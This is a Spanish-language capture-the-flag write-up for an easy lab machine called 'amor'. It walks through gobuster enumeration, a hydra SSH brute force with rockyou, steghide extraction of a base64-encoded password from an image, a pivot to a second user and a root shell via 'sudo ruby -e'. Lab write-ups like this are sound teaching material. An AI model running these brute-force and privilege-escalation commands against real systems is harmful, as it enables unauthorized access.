---
Maquina: amor
SO: Linux
Explotación: Análisis de imágenes y web
Escala_privs: Permisos sudo
Dificultad: Fácil
tags:
  - maquina
  - analisis_imagen
  - linux
  - escala_privs
  - ssh
  - web
---
## Reconocimiento

1. **Explorar los puerto abiertos del docker**: 

![[Pasted image 20241023192623.png]]

Apreciamos que hay una página web y un servicio de SSH, vamos primero a explorar el portal web a ver que nos ofrece.

2. **Explaración web**: 

![[Pasted image 20241023193103.png]]

Ya de primeras en uno de los mensajes apreciamos el nombre de "juan" destacado como que fue despedido (ya tenemos un posible nombre de usuario) y lo firma una tal "carlota" (otro posible vector para fuerza bruta).

![[Pasted image 20241023200530.png]]

Por si acaso le vamos a pasar un gobuster, a ver si detecta algo

```bash 
gobuster dir -u http://172.17.0.2 -w /home/alejandro/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-big.txt -x .php,.py,.js,.txt
```

Por desgracia la información que nos da es muy escasa, tan solo un recurso al que no podemos acceder.

![[Pasted image 20241023193317.png]]

3. **Fuerza bruta**: 

Toca pasar a la fuerza bruta...

```bash 
hydra -l carlota -P /home/alejandro/wordlists/rockyou.txt ssh://172.17.0.2
```

Y sorpresita...

![[Pasted image 20241023193936.png]]

y ¿podremos entrar?

![[Pasted image 20241023194042.png]]

Ya lo creo que si.

4. **Explorar los archivos de Carlota**: 

Muy bien ahora vamos a ver si podemos conseguir un vector de escala de privs. Primero vamos a lo básico, que permisos sudo tenemos?

```bash 
sudo -l
```

![[Pasted image 20241023194144.png]]

No iba a ser tan sencillo... Pero si que vamos a hacer un pequeño upgrade de shell, porque esta es horrible

```bash 
SHELL=/bin/bash script -q /dev/null
```

Vamos a inspeccionar el usuario de Carlota a ver que podemos encontrar...

![[Pasted image 20241023194914.png]]

5. **Analizar la fotografía**: 

Tras indagar un poco podemos observar una fotito... nos la vamos a pasar a nuestro ordenador y la vamos a analizar correctamente.

```bash
scp carlota@172.17.0.2:/home/carlota/Desktop/fotos/vacaciones/imagen.jpg ./
```

![[Pasted image 20241023195203.png]]

Que foto más bonita!! Felicidades Carlota!! Ahora vamos a ver si guardas cositas en esta foto ;)

```bash
steghide info imagen.jpg
```

![[Pasted image 20241023195336.png]]

Ayayay Carlotita has sido muy traviesa y te hemos pillado con las manos en la masa... Vamos a ver que ocultas.

```bash
steghide extract -sf imagen.jpg
```

![[Pasted image 20241023195528.png]]

Nos encontramos que Carlota ha ocultado el código -> ZXNsYWNhc2FkZXBpbnlwb24=. Parece cifrado en base64 y si lo desciframos obtenemos lo siguiente -> eslacasadepinypon. 

```bash
echo ZXNsYWNhc2FkZXBpbnlwb24= | base64 -d
```

6. **Acceso al usuario de Oscar**: 

Esto tiene mucha pinta de ser una contraseña, podría ser de juan o será del otro usuario que había en la máquina? un tal oscar?

![[Pasted image 20241023195801.png]]

En mis tiempos diríamos "Carlota está por Oscar!!" a modo de burla. Gracias Carlota :P.

7. **Escalar privs**: 

Vamos a ver si tu amigito Oscar tiene más privs.

![[Pasted image 20241023200003.png]]

Carlota yo que tú me quejaba, como es posible que tu marido tenga estos permisos y tú no... esto no puede ser...

Bueno vamos a gtfobins y nos pegamos el comandito estrella, en este caso será el siguiente:

```bash
sudo ruby -e 'exec "/bin/sh"'
```

Y colorín colorado, esta historia de amor se ha acabado ;)

![[Pasted image 20241023200158.png]]